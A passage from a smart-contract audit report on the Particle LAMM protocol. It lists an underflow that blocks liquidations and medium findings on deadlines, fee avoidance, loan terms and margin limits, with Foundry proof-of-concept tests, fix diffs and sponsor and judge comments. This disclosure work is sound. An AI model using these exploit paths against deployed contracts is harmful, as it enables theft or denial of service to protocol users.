            feeGrowthInside1X128 = feeGrowthGlobal1X128 - lowerFeeGrowthOutside1X128 - upperFeeGrowthOutside1X128;
        } else {
            feeGrowthInside0X128 = upperFeeGrowthOutside0X128 - lowerFeeGrowthOutside0X128;
            feeGrowthInside1X128 = upperFeeGrowthOutside1X128 - lowerFeeGrowthOutside1X128;
        }
    }
```
</details>

This could impact crucial operation that rely on this call, such as liquidation, could revert unexpectedly. This behavior is quite often especially for pools that use lower fee.

Coded PoC :

Add the following test to `/test/OpenPosition.t.sol` :

<details>

```solidity
  function testLiquidationRevert() public {
        address LIQUIDATOR = payable(address(0x7777));
        uint128 REPAY_LIQUIDITY_PORTION = 1000;
        _setupLowerOutOfRange();
        testBaseOpenLongPosition();
        // get lien info
        (, uint128 liquidityInside, , , , , , ) = particlePositionManager.liens(
            keccak256(abi.encodePacked(SWAPPER, uint96(0)))
        );
        // start reclaim
        vm.startPrank(LP);
        vm.warp(block.timestamp + 1);
        particlePositionManager.reclaimLiquidity(_tokenId);
        vm.stopPrank();
        // add back liquidity requirement
        vm.warp(block.timestamp + 7 days);
        IUniswapV3Pool _pool = IUniswapV3Pool(uniswapV3Factory.getPool(address(USDC), address(WETH), FEE));
        (uint160 currSqrtRatioX96, , , , , , ) = _pool.slot0();
        (uint256 amount0ToReturn, uint256 amount1ToReturn) = LiquidityAmounts.getAmountsForLiquidity(
            currSqrtRatioX96,
            _sqrtRatioAX96,
            _sqrtRatioBX96,
            liquidityInside
        );
        (uint256 usdCollateral, uint256 ethCollateral) = particleInfoReader.getRequiredCollateral(liquidityInside, _tickLower, _tickUpper);

        // get swap data
        uint160 currentPrice = particleInfoReader.getCurrentPrice(address(USDC), address(WETH), FEE);
        uint256 amountSwap = ethCollateral - amount1ToReturn;

        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
            tokenIn: address(WETH),
            tokenOut: address(USDC),
            fee: FEE,
            recipient: address(particlePositionManager),
            deadline: block.timestamp,
            amountIn: amountSwap,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: currentPrice + currentPrice / SLIPPAGE_FACTOR
        });
        bytes memory data = abi.encodeWithSelector(ISwapRouter.exactInputSingle.selector, params);
        // liquidate position
        vm.startPrank(LIQUIDATOR);
        vm.expectRevert(abi.encodeWithSelector(Errors.InsufficientRepay.selector));
        particlePositionManager.liquidatePosition(
            DataStruct.ClosePositionParams({lienId: uint96(0), amountSwap: amountSwap, data: data}),
            SWAPPER
        );
        vm.stopPrank();
    }
```

</details>

Also modify `FEE` inside `/test/Base.t.sol` to `500` :

```diff
contract ParticlePositionManagerTestBase is Test {
    using Lien for mapping(bytes32 => Lien.Info);

    IERC20 public constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 public constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 public constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    uint256 public constant USDC_AMOUNT = 50000000 * 1e6;
    uint256 public constant DAI_AMOUNT = 50000000 * 1e18;
    uint256 public constant WETH_AMOUNT = 50000 * 1e18;
    address payable public constant ADMIN = payable(address(0x4269));
    address payable public constant LP = payable(address(0x1001));
    address payable public constant SWAPPER = payable(address(0x1002));
    address payable public constant WHALE = payable(address(0x6666));
    IQuoter public constant QUOTER = IQuoter(0xb27308f9F90D607463bb33eA1BeBb41C27CE5AB6);
    int24 public constant TICK_SPACING = 60;
    uint256 public constant BASIS_POINT = 1_000_000;
-    uint24 public constant FEE = 3000; // uniswap swap fee
+    uint24 public constant FEE = 500; // uniswap swap fee
   ..
}
```

Run the test :

```shell
forge test --fork-url $MAINNET_RPC_URL --fork-block-number 18750931 --match-contract OpenPositionTest --match-test testRevertUnderflow -vvvv
```

Log output :

![image](https://github.com/said017/audits/assets/19762585/8cd12d84-a8f2-4d06-b1cc-be550bca18bb)

It can be observed that the liquidation revert due to the underflow.

### Recommended Mitigation Steps

Use unchecked when calculating `feeGrowthInside0X128` and `feeGrowthInside1X128`.

**[wukong-particle (Particle) confirmed and commented](https://github.com/code-423n4/2023-12-particle-findings/issues/10#issuecomment-1868181113):**
 > Oh this one is great. Will update the code to uncheck `feeGrowthInside0X128` and `feeGrowthInside1X128` calculations. 


***

 
# Medium Risk Findings (15)
## [[M-01] Zero amount token transfers may cause a denial of service during liquidations](https://github.com/code-423n4/2023-12-particle-findings/issues/61)
*Submitted by [adriro](https://github.com/code-423n4/2023-12-particle-findings/issues/61), also found by [immeas](https://github.com/code-423n4/2023-12-particle-findings/issues/66) and [bin2chen](https://github.com/code-423n4/2023-12-particle-findings/issues/30)*

Some ERC20 implementations revert on zero value transfers. Since liquidation rewards are based on a fraction of the available position's premiums, this may cause an accidental denial of service that prevents the successful execution of liquidations.

### Impact

Liquidations in the LAMM protocol are incentivized by a reward that is calculated as a fraction of the premiums available in the position.

<https://github.com/code-423n4/2023-12-particle/blob/a3af40839b24aa13f5764d4f84933dbfa8bc8134/contracts/protocol/ParticlePositionManager.sol#L348-L354>

```solidity
348:         // calculate liquidation reward
349:         liquidateCache.liquidationRewardFrom =
350:             ((closeCache.tokenFromPremium) * LIQUIDATION_REWARD_FACTOR) /
351:             uint128(Base.BASIS_POINT);
352:         liquidateCache.liquidationRewardTo =
353:             ((closeCache.tokenToPremium) * LIQUIDATION_REWARD_FACTOR) /
354:             uint128(Base.BASIS_POINT);
```

These amounts are later transferred to the caller, the liquidator, at the end of the `liquidatePosition()` function.

<https://github.com/code-423n4/2023-12-particle/blob/a3af40839b24aa13f5764d4f84933dbfa8bc8134/contracts/protocol/ParticlePositionManager.sol#L376-L378>

```solidity
376:         // reward liquidator
377:         TransferHelper.safeTransfer(closeCache.tokenFrom, msg.sender, liquidateCache.liquidationRewardFrom);
378:         TransferHelper.safeTransfer(closeCache.tokenTo, msg.sender, liquidateCache.liquidationRewardTo);
```

Reward amounts, `liquidationRewardFrom` and `liquidationRewardTo`, can be calculated as zero if `tokenFromPremium` or `tokenToPremium` are zero, if the liquidation ratio gets rounded down to zero, or if `LIQUIDATION_REWARD_FACTOR` is zero.

Coupled with that fact that some ERC20 implementations [revert on zero value transfers](https://github.com/d-xo/weird-erc20?tab=readme-ov-file#revert-on-zero-value-transfers), this can cause an accidental denial of service in the implementation of `liquidatePosition()`, blocking certain positions from being liquidated.

### Recommendation

Check that the amounts are greater than zero before executing the transfer.

```diff
        // reward liquidator
+       if (liquidateCache.liquidationRewardFrom > 0) {
          TransferHelper.safeTransfer(closeCache.tokenFrom, msg.sender, liquidateCache.liquidationRewardFrom);
+       }
+       if (liquidateCache.liquidationRewardTo > 0) {
          TransferHelper.safeTransfer(closeCache.tokenTo, msg.sender, liquidateCache.liquidationRewardTo);
+       }
```


**[0xleastwood (Judge) commented](https://github.com/code-423n4/2023-12-particle-findings/issues/61#issuecomment-1866972456):**
 > Unlikely token type to even support in the first place. Probably more of a QA issue.

**[wukong-particle (Particle) commented](https://github.com/code-423n4/2023-12-particle-findings/issues/61#issuecomment-1868223734):**
 > Agree with the judge. Though we can add a zero check to all transfers to potentially save gas. 

**[adriro (Warden) commented](https://github.com/code-423n4/2023-12-particle-findings/issues/61#issuecomment-1872538647):**
 > I believe this is similar to the issue that mentions tokens with blocklists (#31, judged as high) as both of these are non standard (in the strict sense of the standard), though it is of course fair to say that blocklists are more frequent (eg usdc, usdt). 
> 
> Note that the protocol doesn't have any sort of allow list to control which ERC20 tokens are supported inside the protocol, and anyone can open a position using any Uniswap pool, which also means any token. The main problem here is that liquidations can be blocked after a position is open, that's why I consider the med severity justified.

**[0xleastwood (Judge) commented](https://github.com/code-423n4/2023-12-particle-findings/issues/61#issuecomment-1872943231):**
 > The difference being that there are little to no tokens supported across all lending platforms which revert on zero token transfer where there are almost always tokens supported with blocklists. 
 >
 > I guess this can remain medium because anyone can LP into a position and protocol liveness should be highlighted here.

 **[wukong-particle (Particle) confirmed](https://github.com/code-423n4/2023-12-particle-findings/issues/61#issuecomment-1889804514)**

***

## [[M-02] Dangerous use of deadline parameter](https://github.com/code-423n4/2023-12-particle-findings/issues/59)
*Submitted by [adriro](https://github.com/code-423n4/2023-12-particle-findings/issues/59), also found by [immeas](https://github.com/code-423n4/2023-12-particle-findings/issues/40)*

<https://github.com/code-423n4/2023-12-particle/blob/a3af40839b24aa13f5764d4f84933dbfa8bc8134/contracts/libraries/LiquidityPosition.sol#L144> 

<https://github.com/code-423n4/2023-12-particle/blob/a3af40839b24aa13f5764d4f84933dbfa8bc8134/contracts/libraries/LiquidityPosition.sol#L197> 

<https://github.com/code-423n4/2023-12-particle/blob/a3af40839b24aa13f5764d4f84933dbfa8bc8134/contracts/libraries/LiquidityPosition.sol#L260>

The protocol is using `block.timestamp` as the deadline argument while interacting with the Uniswap NFT Position Manager, which completely defeats the purpose of using a deadline.

### Impact

Actions in the Uniswap NonfungiblePositionManager contract are protected by a `deadline` parameter to limit the execution of pending transactions. Functions that modify the liquidity of the pool check this parameter against the current block timestamp in order to discard expired actions.

These interactions with the Uniswap position are present in the LiquidityPosition library. The functions `mint()`, `increaseLiquidity()` and `decreaseLiquidity()` call their corresponding functions in the Uniswap Position Manager, providing `block.timestamp` as the argument for the `deadline` parameter:

<https://github.com/code-423n4/2023-12-particle/blob/a3af40839b24aa13f5764d4f84933dbfa8bc8134/contracts/libraries/LiquidityPosition.sol#L131-L146>

```solidity
131:         // mint the position
132:         (tokenId, liquidity, amount0Minted, amount1Minted) = Base.UNI_POSITION_MANAGER.mint(
133:             INonfungiblePositionManager.MintParams({
134:                 token0: params.token0,
135:                 token1: params.token1,
136:                 fee: params.fee,
137:                 tickLower: params.tickLower,
138:                 tickUpper: params.tickUpper,
139:                 amount0Desired: params.amount0ToMint,
140:                 amount1Desired: params.amount1ToMint,
141:                 amount0Min: params.amount0Min,
142:                 amount1Min: params.amount1Min,
143:                 recipient: address(this),
144:                 deadline: block.timestamp
145:             })
146:         );
```

<https://github.com/code-423n4/2023-12-particle/blob/a3af40839b24aa13f5764d4f84933dbfa8bc8134/contracts/libraries/LiquidityPosition.sol#L189-L199>

```solidity
189:         // increase liquidity via position manager
190:         (liquidity, amount0Added, amount1Added) = Base.UNI_POSITION_MANAGER.increaseLiquidity(
191:             INonfungiblePositionManager.IncreaseLiquidityParams({
192:                 tokenId: tokenId,
193:                 amount0Desired: amount0,
194:                 amount1Desired: amount1,
195:                 amount0Min: 0,
196:                 amount1Min: 0,
197:                 deadline: block.timestamp
198:             })
199:         );
```

<https://github.com/code-423n4/2023-12-particle/blob/a3af40839b24aa13f5764d4f84933dbfa8bc8134/contracts/libraries/LiquidityPosition.sol#L254-L262>

```solidity
254:         (amount0, amount1) = Base.UNI_POSITION_MANAGER.decreaseLiquidity(
255:             INonfungiblePositionManager.DecreaseLiquidityParams({
256:                 tokenId: tokenId,
257:                 liquidity: liquidity,
258:                 amount0Min: 0,
259:                 amount1Min: 0,
260:                 deadline: block.timestamp
261:             })
262:         );
```

Using `block.timestamp` as the deadline is effectively a no-operation that has no effect nor protection. Since `block.timestamp` will take the timestamp value when the transaction gets mined, the check will end up comparing `block.timestamp` against the same value, i.e. `block.timestamp <= block.timestamp` (see <https://github.com/Uniswap/v3-periphery/blob/697c2474757ea89fec12a4e6db16a574fe259610/contracts/base/PeripheryValidation.sol#L7>).

Failure to provide a proper deadline value enables pending transactions to be maliciously executed at a later point. Transactions that provide an insufficient amount of gas such that they are not mined within a reasonable amount of time, can be picked by malicious actors or MEV bots and executed later in detriment of the submitter.

See [this issue](https://github.com/code-423n4/2022-12-backed-findings/issues/64) for an excellent reference on the topic (the author runs a MEV bot).

### Recommendation

Add a deadline parameter to each of the functions that are used to manage the liquidity position, `ParticlePositionManager.mint()`, `ParticlePositionManager.increaseLiquidity()` and `ParticlePositionManager.decreaseLiquidity()`. Forward this parameter to the corresponding underlying calls to the Uniswap NonfungiblePositionManager contract.

**[wukong-particle (Particle) confirmed and commented](https://github.com/code-423n4/2023-12-particle-findings/issues/59#issuecomment-1868223319):**
 > Good practice to learn! Will add a proper in the input timestamp.

***

## [[M-03] Increase liquidity in close position may not cover original borrowed liquidity](https://github.com/code-423n4/2023-12-particle-findings/issues/55)
*Submitted by [adriro](https://github.com/code-423n4/2023-12-particle-findings/issues/55)*

<https://github.com/code-423n4/2023-12-particle/blob/a3af40839b24aa13f5764d4f84933dbfa8bc8134/contracts/protocol/ParticlePositionManager.sol#L424> 

<https://github.com/code-423n4/2023-12-particle/blob/a3af40839b24aa13f5764d4f84933dbfa8bc8134/contracts/protocol/ParticlePositionManager.sol#L432>

When a position is closed, there is no check to ensure that the effective added liquidity covers the original borrowed liquidity from the LP.

### Impact

Closing a position in the Particle LAMM protocol must ensure that the borrowed liquidity gets fully added back to the LP. Independently of the outcome of the trade, the LP should get its liquidity back. The implementation of `_closePosition()` calculates the required amounts and executes a call to `LiquidityPosition.increaseLiquidity()`, which ends up calling `increaseLiquidity()` in the Uniswap Position Manager.

<https://github.com/code-423n4/2023-12-particle/blob/a3af40839b24aa13f5764d4f84933dbfa8bc8134/contracts/protocol/ParticlePositionManager.sol#L422-L439>

```solidity
422:         // add liquidity back to borrower
423:         if (lien.zeroForOne) {
424:             (cache.liquidityAdded, cache.amountToAdd, cache.amountFromAdd) = LiquidityPosition.increaseLiquidity(
425:                 cache.tokenTo,
426:                 cache.tokenFrom,
427:                 lien.tokenId,
428:                 cache.amountToAdd,
429:                 cache.amountFromAdd
430:             );
431:         } else {
432:             (cache.liquidityAdded, cache.amountFromAdd, cache.amountToAdd) = LiquidityPosition.increaseLiquidity(
433:                 cache.tokenFrom,
434:                 cache.tokenTo,
435:                 lien.tokenId,
436:                 cache.amountFromAdd,
437:                 cache.amountToAdd
438:             );
439:         }
```

As we can see in lines 424 and 432, the effective results of the liquidity increment are returned from the call to Uniswap NPM. Both `amountToAdd` and `amountFromAdd` are correctly overwritten with the actual amounts used by the `addLiquidity()` action, but `liquidityAdded` is simply assigned to the cache and never checked.

The effective added liquidity may fall short to cover the original borrowed liquidity, and if so the lien will be closed without returning the full amount to the LP.

### Recommendation

Ensure the effective added liquidity covers the original borrowed amount.

```diff
        // add liquidity back to borrower
        if (lien.zeroForOne) {
            (cache.liquidityAdded, cache.amountToAdd, cache.amountFromAdd) = LiquidityPosition.increaseLiquidity(
                cache.tokenTo,
                cache.tokenFrom,
                lien.tokenId,
                cache.amountToAdd,
                cache.amountFromAdd
            );
        } else {
            (cache.liquidityAdded, cache.amountFromAdd, cache.amountToAdd) = LiquidityPosition.increaseLiquidity(
                cache.tokenFrom,
                cache.tokenTo,
                lien.tokenId,
                cache.amountFromAdd,
                cache.amountToAdd
            );
        }
        
+       require(cache.liquidityAdded >= lien.liquidity, "Failed to cover borrowed liquidity");
```

**[wukong-particle (Particle) acknowledged and commented](https://github.com/code-423n4/2023-12-particle-findings/issues/55#issuecomment-1868222714):**
 > We omit the check intentionally because the amount required to repay is calculated with uniswap math in the contract: https://github.com/code-423n4/2023-12-particle/blob/main/contracts/protocol/ParticlePositionManager.sol#L410. 
> 
> However, in our experience, this calculation might be tiny bit off when the actual amount is returned in `cache.liquidityAdded`.
> 
> If we need to check, we should do something like
> 
> ```
> require(cache.liquidityAdded + lien.liquidity / 1_000_000 >= lien.liquidity, "Failed to cover borrowed liquidity");
> ```
> 
> where `1_000_000` is a buffer. But getting this `1_000_000` check is only just to satisfy the calculation..
> 
> Unless this opens some other attack angle -- can someone somehow flash loan and change price dramatically to make this calculation off by a lot?
> 
> If not, we tend to skip this extra check. Thanks!


***

## [[M-04] Add premium doesn't collect fees](https://github.com/code-423n4/2023-12-particle-findings/issues/54)
*Submitted by [adriro](https://github.com/code-423n4/2023-12-particle-findings/issues/54), also found by [bin2chen](https://github.com/code-423n4/2023-12-particle-findings/issues/32)*

Fees are applied to premiums when a new position is opened, but the same mechanism is not enforced when margin is added to an existing position.

### Impact

When a new position is created in the LAMM protocol, fees are collected in favor of the LP owner that provides the liquidity for the position. The fee is calculated by applying a configurable rate over the tokens "from" amounts:

<https://github.com/code-423n4/2023-12-particle/blob/a3af40839b24aa13f5764d4f84933dbfa8bc8134/contracts/protocol/ParticlePositionManager.sol#L191-L201>

```solidity
191:         // pay for fee
192:         if (FEE_FACTOR > 0) {
193:             cache.feeAmount = ((params.marginFrom + cache.amountFromBorrowed) * FEE_FACTOR) / Base.BASIS_POINT;
194:             cache.treasuryAmount = (cache.feeAmount * _treasuryRate) / Base.BASIS_POINT;
195:             _treasury[cache.tokenFrom] += cache.treasuryAmount;
196:             if (params.zeroForOne) {
197:                 lps.addTokensOwed(params.tokenId, uint128(cache.feeAmount - cache.treasuryAmount), 0);
198:             } else {
199:                 lps.addTokensOwed(params.tokenId, 0, uint128(cache.feeAmount - cache.treasuryAmount));
200:             }
201:         }
```

The fee is applied to `amountFromBorrowed`, the "from" amount from the LP liquidity, and `marginFrom`, the user provided margin to cover the required amount for the swap and provide a premium in the position.

However, the same logic is not followed when the borrower adds more margin using `addPremium()`. In this case, the amounts are added in full to the position's premiums without incurring any fees.

This not only represents an inconsistent behavior (which may be a design decision), but allows the borrower to avoid paying part of the fees. The borrower can provide enough `marginTo` so that the swap can reach the required `collateralTo` amount, leaving the token "from" premium at zero. Then, in a second call, provide the needed premium to cover for eventual LP fees using `addPremium()`. This can be done with null liquidation risk and is greatly simplified by leveraging the multicall functionality. The borrower can bundle both operations in a single transaction, without even deploying a contract.

### Proof of Concept

A user can skip paying part of the fees by bundling two operations in a single transaction:

1.  A call to `openPosition()` with the minimal required amount of `marginFrom` so that `amountReceived + amountToBorrowed + marginTo >= collateralTo`.
2.  A call to `addPremium()` to provide the required premiums to cover for eventual fees.

### Recommendation

Apply the same fee schedule to `addPremium()`. Depending on the value of `zeroForOne`, determine the "from" token, apply the `FEE_FACTOR` to it, and accrue the fee to the corresponding liquidity position.

**[wukong-particle (Particle) acknowledged and commented](https://github.com/code-423n4/2023-12-particle-findings/issues/54#issuecomment-1868222052):**
 > I think this fee free premium is by design. We were only targeting the minimum required margin + the borrowed amount to calculate for fees. More friendly for traders. 


**[adriro (Warden) commented](https://github.com/code-423n4/2023-12-particle-findings/issues/54#issuecomment-1868295915):**
 > > We were only targeting the minimum required margin + the borrowed amount to calculate for fees.
> 
> Correct, this is exactly what the issue is about (the title might be a bit misleading). The borrower can skip paying the "minimum required margin" part of the fees.

**[wukong-particle (Particle) commented](https://github.com/code-423n4/2023-12-particle-findings/issues/54#issuecomment-1868301614):**
 > Hmm sorry "minimum required margin" is the amount to meet `collateralFrom/To`. This margin cannot be skipped because otherwise opening a position won't have enough to cover `collateralFrom/To`.


***

## [[M-05] Modifying the loan term setting can default existing loans](https://github.com/code-423n4/2023-12-particle-findings/issues/52)
*Submitted by [adriro](https://github.com/code-423n4/2023-12-particle-findings/issues/52), also found by [immeas](https://github.com/code-423n4/2023-12-particle-findings/issues/39), [bin2chen](https://github.com/code-423n4/2023-12-particle-findings/issues/34), and [ladboy233](https://github.com/code-423n4/2023-12-particle-findings/issues/3)*

Protocol admins can modify the loan term settings. This action can inadvertently default existing loans created under different terms.

### Impact

Positions in the Particle LAMM protocol are created for a configurable period of time, defined by the `LOAN_TERM` variable. If the loan exceeds this duration, and the LP owner stops renewals that affect their position, the lien can be liquidated.

<https://github.com/code-423n4/2023-12-particle/blob/a3af40839b24aa13f5764d4f84933dbfa8bc8134/contracts/protocol/ParticlePositionManager.sol#L358-L368>

```solidity
358:         // check for liquidation condition
359:         ///@dev the liquidation condition is that
360:         ///     (EITHER premium is not enough) OR (cutOffTime > startTime AND currentTime > startTime + LOAN_TERM)
361:         if (
362:             !((closeCache.tokenFromPremium < liquidateCache.tokenFromOwed ||
363:                 closeCache.tokenToPremium < liquidateCache.tokenToOwed) ||
364:                 (lien.startTime < lps.getRenewalCutoffTime(lien.tokenId) &&
365:                     lien.startTime + LOAN_TERM < block.timestamp))
366:         ) {
367:             revert Errors.LiquidationNotMet();
368:         }
```

The liquidation condition in line 365 does the check using the current value of `LOAN_TERM`. As the loan term can be updated using `updateLoanTerm()`, this means that reducing this value may inadvertently cause the liquidation of existing positions that were originally intended for a longer period of time.

### Proof of concept

Let's say the current configured loan term in ParticlePositionManager is 2 weeks.

1.  A user creates a new position, expecting it to last at least 2 weeks.
2.  The owner of the LP calls `reclaimLiquidity()` to stop it from being renewed.
3.  The protocol changes the loan term setting to 1 week.
4.  The user is liquidated after 1 week.

### Recommendation

Store the loan term value at the time the position was created in the Lien structure, e.g. in `lien.loanTerm`. When checking the liquidation condition, calculate the end time using this value to honor the original loan term.

```diff
    if (
        !((closeCache.tokenFromPremium < liquidateCache.tokenFromOwed ||
            closeCache.tokenToPremium < liquidateCache.tokenToOwed) ||
            (lien.startTime < lps.getRenewalCutoffTime(lien.tokenId) &&
-               lien.startTime + LOAN_TERM < block.timestamp))
+               lien.startTime + lien.loanTerm < block.timestamp))
    ) {
        revert Errors.LiquidationNotMet();
    }
```

**[wukong-particle (Particle) acknowledged and commented](https://github.com/code-423n4/2023-12-particle-findings/issues/52#issuecomment-1868221781):**
 > Hmm we are reluctant to add more data into `lien` struct because we want to restrict it to be less than 3 `uint256`. This can only be affected by contract level update of `LOAN_TERM`, which should be quite rare (controlled by governance in the future).

**[adriro (Warden) commented](https://github.com/code-423n4/2023-12-particle-findings/issues/52#issuecomment-1868295539):**
 > > Hmm we are reluctant to add more data into `lien` struct because we want to restrict it to be less than 3 `uint256`. This can only be affected by contract level update of `LOAN_TERM`, which should be quite rare (controlled by governance in the future).
> 
> I don't understand the concern here. Is this just gas? Loading `LOAN_TERM` will also require loading a word from storage. In any case, even if this is gov controlled, given enough protocol activity it will be difficult to update the setting without conflicting with existing loans.

**[wukong-particle (Particle) commented](https://github.com/code-423n4/2023-12-particle-findings/issues/52#issuecomment-1868300998):**
 > Yeah mostly gas concern. Adding loan term in the storage increases gas for opening/closing/liquidating the position. 

***

## [[M-06] Liquidation condition should not factor the liquidation reward into the premiums](https://github.com/code-423n4/2023-12-particle-findings/issues/51)
*Submitted by [adriro](https://github.com/code-423n4/2023-12-particle-findings/issues/51), also found by [said](https://github.com/code-423n4/2023-12-particle-findings/issues/14)*

The premiums used to determine the liquidation condition have the liquidation reward already discounted, potentially causing a lien to be considered underwater while technically it is not.

### Impact

Positions in Particle LAMM can be liquidated if the owed tokens exceed the available premiums in the lien. Liquidators are incentivized with a reward to keep the protocol sane. This can be found in the implementation of `liquidatePosition()`:

<https://github.com/code-423n4/2023-12-particle/blob/a3af40839b24aa13f5764d4f84933dbfa8bc8134/contracts/protocol/ParticlePositionManager.sol#L348-L368>

```solidity
348:         // calculate liquidation reward
349:         liquidateCache.liquidationRewardFrom =
350:             ((closeCache.tokenFromPremium) * LIQUIDATION_REWARD_FACTOR) /
351:             uint128(Base.BASIS_POINT);
352:         liquidateCache.liquidationRewardTo =
353:             ((closeCache.tokenToPremium) * LIQUIDATION_REWARD_FACTOR) /
354:             uint128(Base.BASIS_POINT);
355:         closeCache.tokenFromPremium -= liquidateCache.liquidationRewardFrom;
356:         closeCache.tokenToPremium -= liquidateCache.liquidationRewardTo;
357: 
358:         // check for liquidation condition
359:         ///@dev the liquidation condition is that
360:         ///     (EITHER premium is not enough) OR (cutOffTime > startTime AND currentTime > startTime + LOAN_TERM)
361:         if (
362:             !((closeCache.tokenFromPremium < liquidateCache.tokenFromOwed ||
363:                 closeCache.tokenToPremium < liquidateCache.tokenToOwed) ||
364:                 (lien.startTime < lps.getRenewalCutoffTime(lien.tokenId) &&
365:                     lien.startTime + LOAN_TERM < block.timestamp))
366:         ) {
367:             revert Errors.LiquidationNotMet();
368:         }
```

The liquidation rewards are calculated as a portion of the premiums, and discounted from these to keep them reserved from any further calculation that may involve `tokenFromPremium` or `tokenToPremium`. However, these are discounted **before** checking the liquidation condition.

The values used to check the conditions at lines 362 and 363 already incorporate the discounted rewards. This implies that the borrower might still maintain a healthy position if it weren't for the subtracted amounts. The lien could be liquidated even if it's not technically underwater.

### Recommendation

Subtract the liquidation rewards from premiums after checking the liquidation condition.

```diff
-       // calculate liquidation reward
-       liquidateCache.liquidationRewardFrom =
-           ((closeCache.tokenFromPremium) * LIQUIDATION_REWARD_FACTOR) /
-           uint128(Base.BASIS_POINT);
-       liquidateCache.liquidationRewardTo =
-           ((closeCache.tokenToPremium) * LIQUIDATION_REWARD_FACTOR) /
-           uint128(Base.BASIS_POINT);
-       closeCache.tokenFromPremium -= liquidateCache.liquidationRewardFrom;
-       closeCache.tokenToPremium -= liquidateCache.liquidationRewardTo;

        // check for liquidation condition
        ///@dev the liquidation condition is that
        ///     (EITHER premium is not enough) OR (cutOffTime > startTime AND currentTime > startTime + LOAN_TERM)
        if (
            !((closeCache.tokenFromPremium < liquidateCache.tokenFromOwed ||
                closeCache.tokenToPremium < liquidateCache.tokenToOwed) ||
                (lien.startTime < lps.getRenewalCutoffTime(lien.tokenId) &&
                    lien.startTime + LOAN_TERM < block.timestamp))
        ) {
            revert Errors.LiquidationNotMet();
        }
        
+       // calculate liquidation reward
+       liquidateCache.liquidationRewardFrom =
+           ((closeCache.tokenFromPremium) * LIQUIDATION_REWARD_FACTOR) /
+           uint128(Base.BASIS_POINT);
+       liquidateCache.liquidationRewardTo =
+           ((closeCache.tokenToPremium) * LIQUIDATION_REWARD_FACTOR) /
+           uint128(Base.BASIS_POINT);
+       closeCache.tokenFromPremium -= liquidateCache.liquidationRewardFrom;
+       closeCache.tokenToPremium -= liquidateCache.liquidationRewardTo;
```

**[wukong-particle commented](https://github.com/code-423n4/2023-12-particle-findings/issues/51#issuecomment-1868221110):**
 > Hold on. The idea for liquidation is that after paying liquidator, the amount going back to the LP should meet what is rightfully owed to the LP. 
> 
> Let's imagine we just meet the liquidation condition, i.e.
> 
> ```
> closeCache.tokenFromPremium = liquidateCache.tokenFromOwed || 
> closeCache.tokenToPremium = liquidateCache.tokenToOwed
> ```
> 
>  If we get the liquidation reward *after* checking the condition, then it means after deducting the liquidation reward from `tokenFromPremium` and `tokenToPremium`, there isn't enough left to pay for `tokenFromOwed` and `tokenToOwed`. 
> 
> So yeah, I think it's by design that some amount is going to liquidator, and then the left should be enough to meet the LP requirement (liquidation condition).


**[adriro (Warden) commented](https://github.com/code-423n4/2023-12-particle-findings/issues/51#issuecomment-1868295056):**
 > > If we get the liquidation reward _after_ checking the condition, then it means after deducting the liquidation reward from `tokenFromPremium` and `tokenToPremium`, there isn't enough left to pay for `tokenFromOwed` and `tokenToOwed`.
> 
> I understand the argument, but you can never guarantee that premiums will be enough to pay for owed fees. I believe that is why those capped here https://github.com/code-423n4/2023-12-particle/blob/a3af40839b24aa13f5764d4f84933dbfa8bc8134/contracts/protocol/ParticlePositionManager.sol#L476-L477
> 

**[wukong-particle (Particle) disputed and commented](https://github.com/code-423n4/2023-12-particle-findings/issues/51#issuecomment-1868300718):**
 > You are right about the cap. Just want to follow up with the reward before/after liquidation condition -- 
> 
> If it's after, then we *always* pay LP an amount less than the `tokenOwed`. This is because at the very beginning of liquidation condition being met, amount to LP is already deducted from 100% `tokenOwed`. Hence we designed it to do the liquidation reward before the condition check.

**[0xleastwood (Judge) commented](https://github.com/code-423n4/2023-12-particle-findings/issues/51#issuecomment-1868379894):**
 > It seems that this might be by design but I will leave it up to the warden to follow-up with the sponsor. @adriro 

**[said (Warden) commented](https://github.com/code-423n4/2023-12-particle-findings/issues/51#issuecomment-1868492088):**
 > It should also consider the argument inside the duplicate issue [\#14](https://github.com/code-423n4/2023-12-particle-findings/issues/14), that the `LIQUIDATION_REWARD_FACTOR` can be changed by the admin, which can immediately affect the health condition of users' positions.

**[0xleastwood (Judge) decreased the severity to Medium](https://github.com/code-423n4/2023-12-particle-findings/issues/51#issuecomment-1869476678)**

***

## [[M-07] Impossible to open a position with a large `marginTo`](https://github.com/code-423n4/2023-12-particle-findings/issues/44)
*Submitted by [immeas](https://github.com/code-423n4/2023-12-particle-findings/issues/44), also found by [bin2chen](https://github.com/code-423n4/2023-12-particle-findings/issues/64)*

`marginTo/From` is a way to both cover your position and increase your premium when opening a position. There is however a unintended limit on how much `marginTo` you can provide when opening a position.

When doing the swap to increase leverage, the `amountToMinimum` (minimum received amount) is calculated:

[`ParticlePositionManager::openPosition`](https://github.com/code-423n4/2023-12-particle/blob/main/contracts/protocol/ParticlePositionManager.sol#L212):

```solidity
File: contracts/protocol/ParticlePositionManager.sol

212:            collateralTo - cache.amountToBorrowed - params.marginTo, // amount needed to meet requirement
```

As you see here, a `marginTo > collateralTo - cache.amountToBorrowed` will underflow this calculation. Thus there is no way to provide a bigger margin than this.

### Impact

A user cannot supply more margin than `collateralTo - amountToBorrowed` before the opening of the position reverts.

There is a workaround to supply no `marginTo` and then use `addPremium` to increase the premium but I believe this issue still breaks the intended purpose of `marginTo` in the `openPosition` call.

### Proof of Concept

Test in `OpenPosition.t.sol`:

```solidity
    function testOpenLongPositionTooMuchMargin() public {
        // test based on `testBaseOpenLongPosition` and `_borrowToLong`
        uint128 borrowerLiquidity = _liquidity / _borrowerLiquidityPorition;
        (uint256 amount0ToBorrow, uint256 amount1ToBorrow) = LiquidityAmounts.getAmountsForLiquidity(
            _sqrtRatioX96,
            _sqrtRatioAX96,
            _sqrtRatioBX96,
            borrowerLiquidity
        );
        (, uint256 requiredEth) = particleInfoReader.getRequiredCollateral(borrowerLiquidity, _tickLower, _tickUpper);
        uint256 amountNeeded = QUOTER.quoteExactOutputSingle(
            address(USDC),
            address(WETH),
            FEE,
            requiredEth - amount1ToBorrow,
            0
        );
        uint256 amountFrom = amountNeeded + amountNeeded / 1e6 - amount0ToBorrow;
        uint256 amountSwap = amountFrom + amount0ToBorrow;
